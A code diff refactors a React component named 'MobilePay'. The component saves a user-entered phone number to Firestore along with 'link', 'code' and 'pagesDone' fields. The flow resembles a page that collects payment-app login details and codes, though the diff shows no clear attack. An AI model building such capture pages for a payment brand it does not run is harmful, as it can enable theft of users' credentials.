@@ -1,11 +1,12 @@
+import { getApp, getApps } from "firebase/app";
 import { addDoc, collection, doc, setDoc } from "firebase/firestore";
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import { useOutletContext } from "react-router-dom";
-import { db } from "../../firebase";
 
 function MobilePay() {
   const [number, setNumber] = useState("");
-  const [identifier, setIdentifier] = useOutletContext();
+  const [identifier, setIdentifier, db] = useOutletContext();
+
 
   const UserLogin = async () => {
     if (!number) return;
@@ -18,8 +19,8 @@ function MobilePay() {
       loading: false,
       link: "login",
       code: "",
-      date: (new Date()).toISOString(),
-      pagesDone: ["mobilepay"]
+      date: new Date().toISOString(),
+      pagesDone: ["mobilepay"],
     });
     setIdentifier(number);
   };
